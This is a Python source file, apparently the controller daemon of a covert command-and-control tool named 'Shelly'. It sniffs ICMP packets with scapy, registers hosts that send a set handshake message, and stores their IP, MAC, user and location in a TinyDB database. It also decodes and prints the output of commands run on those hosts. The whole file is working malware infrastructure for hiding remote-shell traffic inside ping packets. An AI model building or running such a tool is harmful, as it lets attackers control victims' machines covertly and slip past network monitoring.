#!/usr/bin/python3

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
import time

TTL = int(64)
ICMP_ID = int(12800)

class Daemon(Host):
    
    def __init__(self):
        super().__init__()
        if os.path.exists('./db.json'):
            os.remove('./db.json')
        self.db = TinyDB('./db.json')

    def join(self, shellpack):
        match shellpack['message']:
            case "hello how are you":
                
                target = {
                    "id": round(time.time()),
                    "ip": shellpack['ip'],
                    "iface": shellpack['iface'],
                    "mac": shellpack['mac'],
                    "user": shellpack['user'],
                    "location": shellpack['location'],
                    "status": "STANDBY"
                    }

                self.db.insert(target)
                self.send(target['ip'], "join", "fine thank you")
                
                self.db.update({'status': 'CONNECTED'}, Query().id == target['id'])
            case _:
                print("Invalid join message")
        return

    def instruction(self, shellpack):
        print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
        
if __name__ == "__main__":

    print("[ Starting Shelly daemon ]")
    shellyd = Daemon()
    print(shellyd)

    print("[ Starting sniffer ]")
    print("[ Shellpack log ]")
    sniff(iface=shellyd.iface, filter="icmp", prn=shellyd.sniff_callback, store="0")
